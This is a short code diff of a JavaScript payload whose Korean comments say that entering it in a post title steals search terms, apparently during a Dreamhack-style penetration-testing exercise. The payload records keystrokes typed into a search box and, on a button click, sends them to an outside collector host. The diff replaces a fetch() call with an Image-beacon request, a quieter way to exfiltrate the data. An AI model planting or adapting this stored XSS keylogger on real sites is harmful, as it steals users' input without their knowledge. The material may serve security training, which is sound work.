@@ -1,5 +1,4 @@
-// 글 제목 부분에 입력하면 검색어를 탈취할 수 있다.
-// 모의해킹 점검 중 9
+// 글 제목 부분에 Payload를 입력하면 검색어를 탈취할 수 있다.
 const search_word = document.getElementsByName("search_word")[0];
 
 var search_keylog = "";
@@ -11,6 +10,7 @@ search_word.addEventListener("keyup", () => {
 const search_btn = document.getElementsByTagName("button")[0];
 
 search_btn.addEventListener('click', () => {
-    fetch("https://hnbarkv.request.dreamhack.games?k=" + search_keylog);
+    var i = new Image();
+    i.src = "https://ceyiqhh.request.dreamhack.games?keyword" + search_keylog;
     search_keylog = "";
 })
